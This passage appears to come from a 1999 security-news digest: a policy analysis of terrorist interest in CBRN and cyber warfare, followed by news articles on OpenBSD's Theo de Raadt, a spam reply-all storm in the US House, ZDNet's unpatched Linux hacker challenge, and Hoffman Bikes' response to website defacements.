      Center. In the mid-1980s, the Tamil secessionist group, LTTE (which provides its
      operatives with a cyanide pill in the event of capture) threatened to carry out a
      BW attack by spreading pathogens to infect humans and crops in Sri Lanka.
      Aum Shinrikyo also attempted, albeit unsuccessfully, on at least 10 occasions to
      disperse biological warfare agents in aerosol form, and in October 1992 its
      members attempted to acquire Ebola virus samples in then Zaire for future use in
      biological attacks. In mid-1997, an American white supremacist faction plotted to
      attack the New York City subway system with biological weapons. Reportedly,
      Hizbullah and Hamas operatives have acquired chemical and biological
      components, although they have so far refrained from carrying out such attacks. 
      
      Until its top leaders were arrested, some members of the Aum group also studied
      uranium enrichment and laser technology which are necessary for acquiring the
      capability to develop nuclear weapons. The group had one or possibly more of its
      followers on the staff of the Russian Kurchatov Institute's nuclear physics
      laboratory. In September 1998, Mamdouh Mahmud Salim, a top aide to Osama
      Bin Laden was arrested in Munich while trying to procure enriched uranium for
      developing nuclear weapons. 
      
      One of the first known instances of cyberterrorism occurred in 1997 when the
      LTTE launched cyber attacks against Sri Lankan government sites, including
      hacking into a government web site and altering it to transmit their own political
      propaganda. Supporters of the Mexican Zapatista rebels have jammed Mexican
      government web sites. The American terrorist group, the Christian Patriot
      movement, is active in the Internet.??? The Osama Bin Laden group utilises an
      extensive network of computers, disks for data storage, and Internet for e-mail
      and electronic bulletin boards to exchange information. Hamas operatives in the
      Middle East and elsewhere use Internet chat rooms and e-mail to coordinate
      activities and plan operations. Other Middle Eastern terrorist groups, such as
      Lebanon's Hizbullah and Algeria's Armed Islamic Group, also utilise computers
      and the Internet for communications and propaganda. 
      
      Terrorists have also targeted critical infrastructure. Thus, for example, in the
      Summer of 1998, the LTTE bombed state-owned and private telecommunications
      facilities in Sri Lanka, damaging buildings and disrupting telephone service. 
      
      Motivation 
      
      Motivation concerns the psychological, political and strategic factors that are
      likely to serve as incentives or disincentives for terrorist groups to resort to
      CBRN/Cyber warfare, particularly the decision to embark on a higher lethality and
      disruption in targeting. Motivations are an important factor because they influence
      a group's destructive or disruptive potential and the paths and links that they are
      likely to pursue to acquire the necessary technological and operational
      capabilities to launch CBRN/Cyber attacks. It is important to assess these
      motivations because a misunderstanding of a terrorist group's decision making
      regarding CBRN/Cyber warfare could lead to underestimating or overestimating a
      group's CBRN/Cyber capability, surprises about unanticipated attacks, the types
      of weapons chosen, the timeframe for such attacks, and likely targets. 
      
      The psychological factors that are likely to drive terrorist groups to embark on
      CBRN/Cyber warfare might be irrationally or rationally based. Thus, irrational
      factors might be characterised as leadership by extremist, paranoid or criminally
      insane border-line personalities, who are driven by a suicidal 'culture of death'. On
      the other hand, rationally-based factors would include a need for the great
      prestige and power that such weapons would provide or the pursuit of
      mass-casualty type vengeance against particularly repressive government
      policies or excessively harsh government retaliation. Both types of psychological
      actors tend to be authoritarian, and, although the latter type might behave like
      rational actors, both types reject commonly accepted societal norms, standards
      or proportions that would make them less inclined to exceed a certain violence
      and mass casualty threshold, and thus they would be more prone to commit
      catastrophic violence and disruption. 
      
      The political factors that would motivate terrorist groups to resort to catastrophic
      warfare range from particular to broad grievances against a perceived enemy
      state, sub-state actors or transnational organisations, and their objectives vary
      from revolution, secession for a religious, ethnic or national community, to
      nihilism and the complete destruction of a state. A second set of political factors
      that are particularly susceptible to a lack of conventional constraints on
      catastrophic violence are religious beliefs that advocate visions of apocalyptic
      millennialism, messianic apocalypse or redemptiveness, in which CBRN/Cyber
      type violence is employed to hasten in a new millenium, the arrival of a messiah,
      or a new order. This is particularly the case with messianic groups such as Aum
      Shinrikyo which view the society that they seek to destroy as inherently
      worthless and offer their adherents a path to a higher existence through rebirth in
      the next life. A third set of political factors includes virulent racist or ethnic
      hatreds by terrorist groups resolution of which they believe would be achieved by
      the destruction or annihilation of the enemy community. 
      
      Strategy vis-α-vis CBRN/Cyber warfare concerns how a terrorist group's
      leadership defines its broad objectives and the means and targets necessary for
      their attainment. For example, a terrorist group that is inclined towards a strategy
      of minimising risk or failure, of using violence to influence, but not destroy an
      opponent, is concerned about backlash within its own community or intended
      audience, and fears massive military retaliation by a foreign state against its own
      group and supporting community, might be more likely to adopt tactics that call
      for conventional warfare, whereas a group whose strategy is unconstrained by
      these factors might be more likely to pursue the CBRN/Cyber catastrophic
      option. Thus, an extremist religious terrorist group that regards violence as a
      sacramental act or divine duty, and the constituency of which is limited to its own
      group, would likely be unconstrained to employ the most lethal violent means at
      its disposal. A further strategic objective might be to carry out or threaten to carry
      out a CBRN/Cyber attack in order to perpetrate an economic extortion or to
      massively damage a critical infrastructure node, such as a food supply. Another
      strategic consideration concerns the decision whether or not to seek state
      sponsorship and assistance in CBRN/Cyber warfare. A final consideration is
      whether the group needs to claim credit for a CBRN/Cyber attack. In fact, the
      reduced need to claim credit for such attacks signals the emergence of the
      "silent terrorists," and is another factor contributing to loosening self-imposed
      constraints against higher levels of lethality. 
      
      Organization 
      
      There are no fixed organisational prerequisites for attaining CBRN/Cyber
      capability, particularly in the age of the Internet when terrorist operatives can be
      dispersed geographically yet are able to communicate with each other by using
      their own secured communications networks. At one end of the organisational
      spectrum, the technological complexities involved in acquiring CBRN/Cyber
      capability require a well organised, hierarchical organisation, with a command
      and control apparatus staffed by professional terrorists, a highly- developed R&D
      apparatus staffed by scientists and technicians, production and storage facilities,
      a transnational logistics network to clandestinely acquire the necessary
      technology from external sources, and business activities (either legitimate or
      illegitimate) to generate the necessary income to fund the acquisition of
      CBRN/Cyber operational capability. 
      
      At the other end of the organisational spectrum, a CBRN/Cyber operational
      capability might be acquired by a terrorist entity of a transitory, ad hoc
      amalgamation that bands together for a single mission, that is less cohesive and
      more diffuse organizationally, and is staffed by a small number of professional
      operatives and amateur associates. In addition, such groups, such as the Osama
      Bin Laden network, do not generally operate out of geographically bound
      sanctuaries or safe-havens and their activities are not confined to specific
      operational areas, but are dispersed worldwide. The use of amateurs by
      professional terrorists is significant because these can be used as pawns, cut-
      outs or expendable minions to conceal the identity of the particular organisation
      or state sponsor that actually orders or commissions a CBRN/Cyber attack. In
      such a case, CBRN/Cyber warfare would be carried out by an organizationally ad
      hoc terrorist entity, backed by a state sponsor, that joins forces for a specific
      one-time operation. 
      
      A related organisational issue is the degree of technical and military
      professionalization required by terrorist groups to conduct CBRN/Cyber warfare,
      or whether amateurs can develop such capability, particularly when aided by a
      state sponsor. Thus, to pursue the CBRN/Cyber warfare option, do terrorist
      groups need to recruit individuals with technical degrees and expertise in
      disciplines such as chemistry, biology, physics, engineering and computer
      science? Moreover, does a group need to organise the training on its own or is a
      state sponsor required to provide instruction and facilities? 
      
      A terrorist group might also train its members in not just a single weapon but a
      variety of CBRN/Cyber weapons for which different sets and levels of
      technological expertise are required in order to attain operational capability in
      each of these weapons. Thus, for example, terrorist groups, such as Aum
      Shinrikyo, have provided their members with extensive training and education in a
      variety of CBRN/Cyber weapons, including studying uranium enrichment and
      laser technology, with at least one of their members working on the staff of a
      Russian nuclear physics laboratory, while another contingent traveled to Africa to
      study the Ebola virus. Cyberwarfare involves a different set of training
      requirements that is also more readily available. Thus, training in computer
      science is now widely prevalent among terrorist groups. 
      
      Funding 
      
      Significant financial resources are required for terrorist groups to develop an
      indigenous CBRN/Cyber operational capability unless a group succeeds in
      weaponising a crude, low-technology device, or stealing or hijacking such a
      device. In general, a range of costs are involved in acquiring, operationalizing,
      stockpiling and deploying CBRN/Cyber weapons of varying levels of
      sophistication and lethality. As a result, financial considerations play a role in
      deciding whether a group will choose single or multiple CBRN/Cyber weapons,
      the types of dispersal systems, and whether these weapons will be indigenously
      developed, obtained from an external source (whether legally or through
      smuggling, hijacking or theft), or are provided by a state sponsor. CBRN/Cyber
      weapons for use in terrorist attacks vary greatly in their cost. For example,
      acquiring production and operational capability to deploy chemical, biological,
      radiological, or cyber capability involves relatively small financial resources, and
      are within the means of many terrorist groups. Far more significant financial
      resources, which only a few groups possess, are necessary to acquire a nuclear
      weapons capability. Nevertheless, some terrorist groups, such as the Aum
      Shinrikyo in its heyday, the Bin Laden network, or Colombian narco-traffickers,
      could, potentially, acquire a miniaturized nuclear weapon because of the vast
      financial resources accruing from their multiplicity of legitimate and criminal
      business enterprises. To launch a cyber attack, a terrorist group could purchase
      relatively inexpensive commercial-off-the-shelf (COTS) software and hardware,
      with some weapons of mass disruption software available on hacker bulletin
      boards and Web sites. 
      
      State Sponsors 
      
      Obtaining the sponsorship of a state with WMD resources can be a major
      facilitator in transitioning to CBRN/Cyber terrorism. There are a number of
      motivations, requirements, and bureaucratic considerations involved in the
      relationship between terrorist groups and potential state sponsors regarding the
      resort to CBRN/Cyber warfare. However, obtaining the support of a state sponsor
      is not automatic or inevitable. Potential state sponsors would have to weigh the
      costs and benefits involved in sponsoring CBRN/Cyber operations by terrorist
      groups, including providing assistance in the phases of research, development,
      production, and operations planning. Other issues concern the conditions and
      arrangements for providing the terrorist group with CBRN/Cyber weapons,
      training, logistics, diplomatic cover and deniability. 
      
      Thus, a number of cost/benefit factors are involved in the relations between state
      sponsors and surrogate terrorist groups. For both there are advantages and
      disadvantages. For terrorist groups state sponsorship can provide assistance in
      terms of funding, intelligence, CBRN/Cyber weaponry, technical expertise,
      training, laboratories, logistics, target reconnaissance and surveillance, escape
      assistance and safe haven, diplomatic cover, and deniability. Thus, for example,
      attaining the support of a state sponsor with nuclear capability (such as Iran,
      Iraq, Pakistan or North Korea) would shortcut the process of fabricating a
      high-grade nuclear bomb with weapons-grade material, which would be extremely
      difficult, although not impossible, for most terrorist groups to develop on their
      own. Such a nuclear weapon, however, would likely be miniaturised and of a
      tactical, not a strategic variety. 
      
      State support need not be explicit or direct. Thus, a state sponsor might
      indirectly influence or remotely control a terrorist group's actions. A state sponsor
      might use amateur terrorists as dupes or cut-outs to conceal their involvement,
      and thus avoid the possibility of retaliation. 
      
      External Hurdles 
      
      There are a number of external hurdles that terrorist groups must overcome in
      order to acquire operational CBRN/Cyber capability. These hurdles include
      technological and logistical factors, obtaining state sponsorship and deterrence
      by foreign intelligence and counterterrorism agencies. 
      
      In terms of technological hurdles, CBRN weapons and Cyber devices vary in the
      levels of technological sophistication required for their development,
      weaponization and deployment. There is also a clear distinction between CBRN
      weapons and Cyber devices. 
      
      Cyberterror devices involve high end technologies, although of a different
      magnitude than CBRN weapons, because, among other factors, the means
      required to access and achieve the massive destruction or breakdown of a critical
      infrastructural information technology (IT)-type target involve entirely different
      kinds of delivery systems (eg computers). 
      
      CBRN weapons are generally at the high end of the technological spectrum,
      although within this high end range there are gradations of technological
      sophistication that terrorists are likely to utilise because of the variances in their
      own operational capabilities. In general, the ranking of CBRN weapons involves
      consideration of the levels of technological sophistication required to develop a
      particular CBRN weapon and the potential weapon effects. Thus, if potential
      weapon effects are being ranked, chemical devices would be placed at the low
      end with tactical nuclear and biological weapons at the high end. On the other
      hand, in terms of levels of sophistication required to develop CBRN weapons, the
      ranking would begin with the lower end chemical and biological to the higher end
      radiological and nuclear. The reason for this ranking is the relative ease with
      which it is possible to construct crude chemical and biological devices. Weapons
      grade biological agents from a producer-country such as Russia are also
      particularly vulnerable to theft or smuggling. Radiological and tactical nuclear
      weapons are harder to develop, although crude approximations of them are
      feasible for some terrorist groups. 
      
      Among CBRN weapons, the most substantial hurdles lie in the fabrication and
      deployment of nuclear weapons. There are enormous technological tasks involved
      in acquiring and utilising weapons grade materials, such as highly enriched
      uranium or plutonium, to produce nuclear explosives. Other than the hurdle of
      indigenously producing a nuclear device, terrorist groups would have either to
      purchase such a device from external sources, to obtain it from a state sponsor,
      or to steal or smuggle it. Tactical nuclear weapons, as opposed to strategic
      nuclear weapons, are most vulnerable to theft or illegal purchase by terrorist
      groups because of their relatively small size, widespread dispersal, and the
      absence among older generations of these weapons of effective electronic locks
      or Permissive Action Links (PALs) to prevent their unauthorized use. There are
      also complex technical requirements involved in deploying a nuclear explosive
      device, particularly in dispersing radioactive material. 
      
      In all these cases of CBRN weapons, it may not be necessary for terrorist groups
      to acquire actual battlefield weapons-certain crude devices or delivery and
      dispersal systems may not achieve mass destruction effects, but might be
      sufficient to inflict mass terror. 
      
      The logistics hurdle involves the capability by terrorist groups to create an
      organizational apparatus and transnational network not only to acquire the
      technology to produce CBRN/Cyber weapons and devices, but to conduct target
      reconnaissance and surveillance, and then to transport, deliver, disperse and
      disseminate the weapon against the intended target and, if possible, carry out an
      escape. 
      
      Obtaining state support represents another external hurdle. A state sponsor
      might be reluctant to collaborate with a terrorist group in the CBRN/Cyber warfare
      realm because of the enormous political costs and risks of retaliation and
      exposure. Moreover, there is always the possibility that a terrorist group might
      prove unreliable or inefficient, or, in a worst case scenario, use CBRN/ Cyber
      weapons against their sponsor. On the other hand, there are certain factors,
      conditions and circumstances that are likely to facilitate cooperation and joint
      ventures between state sponsors and terrorist groups. Thus, for example, using a
      surrogate group could enable a state sponsor to achieve certain strategic
      objectives while denying its role in such an attack. 
      
      Several trends and developments are creating a new dynamic in the relationship
      between state sponsors and terrorist groups. In certain CBRN/Cyber areas,
      terrorist groups are less dependent on state sponsors because of widespread
      access to the Internet and other resources that make it relatively easy for
      terrorist groups to learn how to develop chemical or biological agents
      indigenously. Similarly, in terms of cyberwarfare, terrorist groups may have little
      need for state sponsors because much of the applicable software and hardware
      are available commercially and targeting can be accomplished from a computer
      terminal hundreds of miles away from the intended targets. 
      
      Terrorist groups are extremely vulnerable to deterrence by foreign intelligence and
      counterterrorism agencies. Thus, terrorist groups must overcome the continual
      possibility of their activities and operations being detected, monitored, penetrated
      and potentially preempted, interdicted or destroyed by these agencies. 
      
      Conclusion 
      
      CBRN/Cyber terrorist warfare is likely to pose a significant threat in the 21st
      century as a result of the confluence of motivation, technical capabilities, and
      involvement by state sponsors. This analysis is intended to highlight some of the
      internal and external factors, requirements and hurdles that need to be
      considered in assessing a terrorist group's current and future development status
      and operational capability to conduct CBRN/Cyber warfare. Correlating these
      internal and external factors and hurdles would make it possible to forecast which
      terrorist groups and state sponsors are likely to embark on CBRN/ Cyber warfare,
      the types of adaptations and changes they would require to transition to such
      warfare, the types of weapons and targeting they are likely to pursue (including
      the possible resort to single or multiple CBRN/Cyber weapons and devices), the
      timelines for such attacks, and vulnerabilities that could be exploited by foreign
      intelligence and counterterrorism agencies to constrain terrorist groups--and,
      when applicable, state sponsors--from embarking on such warfare.

      Raadt and arguably the most secure out of the box
      operating system there is, OpenBSD.

      Calgarian heads team ensuring OpenBSD security

      Theo de Raadt oversees hundreds of volunteer programmers

                     Matthew McClearn, Calgary Herald

      With nearly two dozen computers scattered
      throughout his Ramsay district home, Theo de
      Raadt is well equipped to lead an international
      software project. 

      De Raadt has been working for three years on
      OpenBSD, a variant of the Unix operating system.
      Unix, favoured by academics, researchers
      and systems administrators for its power and flexibility,
      is the foundation for many popular operating systems,
      including Sun, Solaris and Linux. 

      What Linus Torvalds is to the increasingly popular
      Linux, de Raadt is to OpenBSD. He oversees
      hundreds of volunteer programmers who pore over OpenBSD's code trying to 
      make it better, for little more than glory and the satisfaction of making
      software better. 

      Unlike any other operating system, OpenBSD is engineered from the ground
      up with security in mind. 

      "It's just a really cool process to be involved with," he says. "In two and a
      half years, we haven't found a vulnerability. That means in the first six
      months, we managed to get rid of them all." 

      That's in stark contrast to other operating systems, most notably
      Microsoft's ubiquitous Windows platform. Windows security flaws are
      discovered on a weekly basis. 

      In the early days of Unix, the University of California at Berkeley wanted to
      create its own strengthened version. Academics developed Net2, and
      attained a Berkeley Software Distribution (BSD) licence for it -- meaning, in
      short, that developers can modify it and users can install it freely at no cost.

      The university eventually abandoned Net2 because of legal difficulties, but
      by then it had developed a considerable following. It spun off FreeBSD and
      NetBSD, two free operating systems. 

      De Raadt was a founder of the NetBSD and worked on it for three years
      before splitting off following a bitter dispute. In 1996, his computer was
      cracked by a friend. After hacking into each other's systems several times,
      the two began reviewing BSD's 350 megabytes of code looking for security
      holes. 

      The task proved daunting. The harder they looked, the more problems they
      discovered. More and more people pored over the body of code, corrected
      problems and submitted the improvements to de Raadt and his inner circle.
      That code became OpenBSD. 

      Three years later, de Raadt is still doing it. So far, he has spent $76,000 of
      his own money and dedicated many long days. 

      A new version of OpenBSD comes out every six months. It can be
      downloaded for free at www.openbsd.org or purchased on CD-ROM for $30
      US. 

      "I was eating Ichiban and Kraft Dinner because I was too poor to feed
      myself," he recalls. "Then we started selling CDs, and now things are OK." 

      OpenBSD is sold to the world from Calgary. Louis Bertrand, an engineer
      who contributes to OpenBSD, explains that it couldn't be shipped from the
      United States because of that country's stringent encryption export laws,
      which are designed to keep cryptographic tools out of the hands of criminals
      and terrorists. 

      Canada has no such restrictions. The CD label reads: "Made in Canada --
      Land of Free Cryptography." 

      OpenBSD is earning respect for itself among security-conscious
      professionals at banks, research labs, government organizations,
      universities and other sites. 

      Bob Beck, secure systems specialist at the University of Alberta, says it's
      used extensively on campus. 

      "We don't have our OpenBSD machines broken into, and we like that," he
      says. "That's mainly due to people in the project going through and
      pro-actively auditing the code. 

      "It seems most vendors -- Sun, HP, Microsoft and others who sell
      commercial operating systems -- get their product working and they ship it.
      The pressure is to get the product to market fast." 

      Roy Brander, a research analyst for the City of Calgary's waterworks
      division, also admires OpenBSD. 

      "It's a very solid, stable operating system that doesn't go down," he says. "I
      wouldn't accuse other operating systems of being insecure -- OpenBSD can
      be made insecure if you're careless and other operating systems can be
      made secure if you're extremely careful -- but there's no question that out of
      the box, OpenBSD is one of the most secure operating systems you can
      get." 

      Though the server market is beginning to take notice, OpenBSD's user base
      is tiny compared even to Linux, which for all its fame accounts for a
      minuscule slice of the desktop operating system market -- less than five per
      cent. Brander estimates OpenBSD's installations in the tens of thousands. 

      Consequently, it has a comparatively small body of applications that work
      on it and device drivers for hardware can be hard to come by. For that
      reason, it's unlikely to crack the desktop market. 

      De Raadt has earned a reputation for not mincing words. He's openly critical
      of the process by which Linux has been developed. He's also unhappy with
      developers of commercial software vendors like Microsoft, Sun
      Microsystems and Hewlett-Packard, who, he says, take no responsibility
      for the numerous security holes in their products. 

      "They don't care and there's no one to tell them they have to care," he says.
      But, he adds, "security is starting to become something that affects the
      bottom line" and slowly the industry is being forced to address security
      issues. 

      While de Raadt has his critics, he is also respected for his talent and hard
      work. Those qualities would earn him big dollars in the corporate world and
      he says he gets an job offer every three days from venture capitalists. He
      doesn't take them. 

      "I'd feel guilty," he says. "I can actually provide something to the community
      that they'll use. If I were to work for Sun Microsystems, this wouldn't matter
      to their bottom line and I don't think it would see the light of day. I wouldn't
      actually be securing people's systems." 

      Beck adds that even if de Raadt wanted to make it commercial, his fellow
      programmers would abandon him. "Going commercial would probably kill it,
      in my opinion. There would be much more of a pressure to get it to market
      quickly, rather than getting it to market correctly." 

      Fortunately for OpenBSD, de Raadt says the money can wait. 

           "If I had a lot of money, what would I do? I'd do this."

      TIME TO SEEE AN EXPERT HERE'S THE PERFECT OPPORTUNITY. MY FRIEND
      LOSS 40 LBS. READ THIS! [sic]" - spam hit thousands of House of Representatives
      addresses. To make it all funnier recipients hit the reply all button, so very fast mail
      servers were down:) Wired. 
      
      The House of Spam on the Hill
      by Declan McCullagh 
      
      3:00 a.m.  5.Oct.99.PDT
      The spam began typically enough, with a mass email touting quick weight loss pills. 
      
      But by last Friday, the trouble that started with a message sent by one Hill staffer to thousands of House of Representatives addresses had
      mushroomed, clogging inboxes, drawing angry accusations, and prompting mass email replies by anti-spam advocates that made the problem even
      worse. 
      
      
                                                         Read About ISPs and Spam 
      
      
      "IF YOU'RE LOOKING TO LOSE WEIGHT PERMANENTLY AND YOU DON'T HAVE TIME TO SEEE AN EXPERT HERE'S THE PERFECT OPPORTUNITY. MY
      FRIEND LOSS 40 LBS. READ THIS! [sic]" wrote Cher Castillo, an aide to Rep. Alcee Hastings (D-FL), in the original message. 
      
      But many recipients directed their complaints to all the other recipients when they hit Reply All. This further jammed the already-taxed House mail
      servers, creating widespread annoyance, and preventing some House offices from receiving any email at all. 
      
      One response that was particularly ill-received came from Steve Maviglio, chief of staff for Rep. Rush Holt (D-NJ), who -- perhaps inadvertently --
      replied to everyone, lecturing them on the evils of spam and requesting that they support his boss' anti-spam legislation. 
      
      "When I first got it [the spam], I immediately reported it to House Information Resources," he said. 
      
      Then Maviglio wrote, "How would you like to receive thousands of these each day??? Our constituents do -- costing them money and invading their
      privacy. Stop Spam!!!!" 
      
      And then? "I hit Reply All," he said. 
      
      Maviglio said that Microsoft Exchange showed only a few dozen recipients. 
      
      Ooops. 
      
      Some of the recipients -- there are about 20,000 Hill email addresses, though not all were copied -- thought that Maviglio had orchestrated the
      original diet pill spam to promote the so-called Can Spam Act that his office is co-sponsoring. 
      
      He denies it. "All I know is that my name showed up as the first one in many emails so people thought we did it. We're creative but not that
      creative. Besides, it's against House rules," he said. 
      
      A sampling of the hundreds of replies he received: "Undeliverable mail." "I hate you." "Take me off your list." "Die." 
      
      Some irked Hill staffers who saw their inboxes swell last Friday with "get-me-off-this-list" replies say that a new law isn't the answer. 
      
      "People are trying to blame other people to solve problems they caused themselves," said one aide, who asked not to be identified. "They should be
      disciplined." 
      
      Some Congressmen joined the fray, writing that Castillo had violated House rules, and other recipients warned that the diet pills suggested in the
      original message should not be used to lose weight. 
      
      Ironically, if the Can Spam Act had become law -- currently no hearings are scheduled -- Maviglio could be liable for a US$25,000 fine, or "the
      actual monetary loss suffered by the provider as a result of the violation," whichever is larger. 
      
      And what about Cher Castillo, the original spammer? Her office refused to comment and she did not respond to interview requests. 
      
      One staffer who complained to Hasting's office last week about Castillo said at first they didn't take the spam seriously. "But by today they weren't
      laughing," the staffer said.

38.0  PCWEEKS' HACKER CHALLENGE "RIGGED" FOR NT
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      From Help Net Security http://www.net-security.org/
      
      
      by Thejian, Tuesday 5th October 1999 on 5:30 am CET
      There has been quite a lot of discussion on the usefullness of so-called
      "hack-the-box" contests. Well, ZDNet shows us how not to do it. Today, ZDNet Labs
      revealed that they deliberately neglected to apply some 21 different recent security
      patches to the Linux system which participated in the PCWeek hacker challenge,
      including one used by the cracker to gain access to the Linux server. ZDNet's
      response to the charges of the unfairness of omitting the 21 security patches was
      that enterprise businesses would not want to apply 21 individual fixes and that most
      large companies would prefer the one large, sweeping-in-scope, fix. This objection
      didn't prevent ZDNet Labs from hypocritically applying Microsoft's latest huge service
      release for Windows NT in time for the test though. Linux Today

      ZDNet Admits Mistakes in Recent Security Test
      Oct 4, 1999, 23:19 UTC (89 Talkbacks) (Other stories by Arne W. Flones) 
   
      [ The opinions expressed by authors on Linux Today are their own. They speak only for themselves
      and not for Linux Today. ] 
   
      By Arne W. Flones 
   
      Regarding the recent Hacker Shootout, ZDNet Labs today admitted that they deliberately ignored an
      embarrassing 21 security upgrades to one of the two systems under test. (See PC Week: CGI script opens
      door) 
   
      In this alleged test of security, ZDNet Labs invited "hackers" [sic] to try to break into two different
      computers, one running Windows NT and one running the Red Hat distribution of Linux. This came on the
      heals of August's similar battle between Windows NT and an Apple-based Linux distribution which drew a
      lot of publicity. Under criticism from the Linux community for the lack of objectivity in the test, ZDNet's
      director, John Taschek responded, 
   
           [The test] was designed and put together by PC Week for the purpose of testing security
           implementation. We don't care which operating system (if any) is broken into first. We want
           to establish the basis for a story on the best practices for implementing security. 
   
      And later he said, 
   
           We don't care who wins or loses--in fact we're not looking to report a winner or loser. Just
           on implementations. 
   
      In spite of continued protests, the test proceeded and on September 24 the Linux site was cracked using a
      combination of a weakness in Web programming and a security hole in a program called crond, part of
      every Linux installation. 
   
      When the method used by the cracker was revealed, it was immediately apparent that both of the security
      holes could have easily been closed. The first hole, within a type of World Wide Web program called a
      CGI script, could have been avoided by paying closer attention to security when writing the script. This
      hole had nothing to do with Linux, but was in a separate application. The second hole had been publicly
      revealed in August by Red Hat, the distributor of the Linux system under test. Although ZDNet labs might
      have inadvertently slipped up on the first hole, they would have certainly known about the second. The
      cracker used both holes to crack into the system. 
   
      Today, ZDNet Labs revealed that they deliberately neglected to apply some 21 different recent security
      patches to the Linux system, including one used by the cracker to gain access to the Linux server. It is this
      admission that has raised the hackles of knowledgeable computer users, security experts and the Linux
      community. 
   
      As the source instructions which make up Linux are freely available to anybody who wants them, there are
      no reasons to wait to make security changes available to the public. So this number of security patches are
      common in the Linux world. As soon as a security hole is found, it is quickly patched and the fix is
      immediately posted to the public forums on the Net. The ability to look at all the source instructions enables
      anybody to verify the correctness of the patch. Typically, a program to exercise the exploitation is available
      as well. This dramatically reduces the risk in applying these patches. The scope of the changes is very
      narrow and is very easily tested in isolation. Therefore, with a small effort, and in a very short time, an IT
      manager can know the impact the patch will have on her all important systems. The result is that the patch
      can be applied quickly and with the assurance that nothing will break but the cracker's ability to
      compromise the company's data. 
   
      This is very unlike the Windows NT world, where Microsoft keeps all the source instructions secret.
      Microsoft Windows, by nature of its proprietary design, must withhold security information and release the
      fixes all at once in a larger, less frequent, service release. The policy of security through obscurity is
      arguable. But the impact of fixing security holes with an infrequent and all encompassing software upgrade
      is not. It can make testing a nightmare because individual fixes are not testable in exclusion of other
      changes. And, since Microsoft lumps the many security fixes with other, general improvements, adding a
      Microsoft service release enterprise-wide is a very, very risky affair. One never knows what will break.
      Therefore, the rules of the game are very different for Windows than they are for Linux. ZDNet Labs
      conveniently ignores this fact. 
   
      ZDNet's response to the charges of the unfairness of omitting the 21 security patches was that enterprise
      businesses would not want to apply 21 individual fixes and that most large companies would prefer the one
      large, sweeping-in-scope, fix. ZDNet provides no basis for this absurd claim. Their claim goes against
      common practice in the industry and it is against common sense. It is only in the Microsoft world where an
      untestable, monolithic software release is preferable to a few much smaller, and manageable, perturbances.
      Nota bene: ZDNet's objection to the the 21 easily audited and tiny patches didn't prevent ZDNet Labs from
      hypocritically applying Microsoft's latest huge service release for Windows NT in time for the test. 
   
      ZDNet's claims are unsupportable. Not only was ZDNet Labs responsible for allowing the installation of a
      flubbed CGI script which allowed the cracker to peek into the Linux system, they were negligent in
      ignoring 21 known security holes. Their admission today that they deliberately chose not to apply these
      patches has tainted their test. They knew that every cracker would look first at these 21 cricks in Linux's
      armor. No wonder it only took a few days for the Linux system to be cracked. ZDNet's incompetence
      assured it. 
   
      This comes as close to professional malfeasance as I have ever seen. With today's knowledge it is
      impossible for ZDNet to claim even vestigial objectivity. With what we now know of this affair, to continue
      the charade would be an injustice.

      Web site tallies hacks

      No contact with hackers


      (CNN) -- Hack back. That's what Hoffman Bikes decided to do after its Web
      site was defaced for the fourth time by the same hacker group in the past two
      weeks. 

      "Good riders, bad nerds," the group called "r 1 3 9" wrote, mockingly. 

      Marketing director Bryan Baxter finally responded by posting text and images
      that spoofed the company's image and security at its regular address,
      www.hoffmanbikes.com. 

      "If they wanted to make us look stupid, we decided to help them out," he said. 

      The site for the Oklahoma-based bike manufacturer was just one of some two
      dozen to be defaced for hackers in the past 10 days, according to attrition.org,
      a site that logs and mirrors Web defacements. 

      But it was the only one to respond with humor. 

      "We decided that if they were gonna get in that we would help them out,"
      Baxter said. He crafted the site as an online catalog, not for e-commerce, so
      security was not a priority. 

      "It's become a little soap opera," he said. "We just decided not to be too uptight
      about it. They could've done stuff that was a lot worse. They could've put
      porn up on it or something." 

      Baxter put up the counter-hack himself, featuring a less-than-flattering picture
      of Matt Gipson, one of Hoffman's sponsored riders, with a pointer from his
      head to the words "duh, huh?" 

      The counter-site also offered links to Hoffman's real site and the previous
      hacks to the site, as well as to lists for site visitors in case they wanted to join r
      1 3 9 or get work at Hoffman or give it Internet security advice. 

      That drew about 100 responses and dozens of phone calls. 

      'Learning as we go'

      Baxter admitted that the rider-owned company is not "super good" yet at
      operating its Web site. "We're learning as we go," he said. 

      Hoffman pays for its server time in kind from a friend in Texas. "We tried to
      change some things," after the first hack, he said. "We tried four times with
      different server settings and they were still getting in." So he gave up, in
      effect. 

      If the site's security is breached again, Hoffman will just take its site down
      before trying again, he said. 

      Patrice Rapalus, director of Computer Security Institute in San Francisco, said
      beefed up security, patching holes and reports to the authorities are
      recommended responses to hackers, not humor. 

      Defacement, the equivalent of graffiti on a bricks and mortar business, is the
      least of a firm's computer security concerns, she said. 

      That kind of hack is impossible to hide from consumers. Many companies
      prefer to cover up the more serious hack -- intrusions into computer networks,
      she said. 

      Companies hate to admit one likely scenario -- they are unaware that their
      security has been breached, Rapalus said. 

      The number of companies reporting security breaches in the past three years
      rose from 17 percent to 32 percent, she said. 

      And that's just the companies willing to own up to intrusions of which they are
      aware. 

      Security breaches, even Web site defacements, mar a firm's image and can
      damage its electronic business. 

      "It would undermine any kind of trust someone would have in your
      organization and the ability of your organization to safeguard confidential
      information or credit card information," she said. 

      Brian Martin, of attrition.org, said that Hoffman's response to being hacked
      multiply was humorous but irresponsible. 

      "It undermines the idea of secure Web sites and gives their customers the
      impression that the (site) administrator simply does not care about security that
      much," Martin said. 

      Smaller businesses at lower risk

      Sites for government agencies and banks are far more attractive to hackers
      with criminal intent, Rapalus said. 

      "Like anything else, it's follow the money," she said. CSI, a membership
      association, is comprised mainly of Fortune 500 firms and government
      agencies. 

      A list of sites hacked in the past 10 days, as reported by attrition.org, also
      illustrates that point. 

      They included DeltaNet, PanAmSat, a Le Monde publicity site, Altamira
      International Bank, Mount Gay Rum site, DC ArtBeat, Seoul National
      University, Web Yes Singapore and a State of Utah learning resources site. 

      Smaller businesses, like larger ones, need to worry about online security as
      they launch Internet sites, Rapalus said, but they generally are not the focus of
      the most malicious hackers. 

      She recommended a cooperative effort between law enforcement and
      industry to crack down on the big offenders. 

      Web site tallies hacks

      Attrition.org has collected statistics on targets of hacking since it went online
      in 1995. By its count, there have been 79 hacks to general government
      systems, 27 to NASA, 19 to Army systems, 47 to other military systems, 103
      to educational institutions and 1,042 to commercial systems. 

      Groups called Antichrist and Forpaxe lead the pack, with 148 and 140 hacks
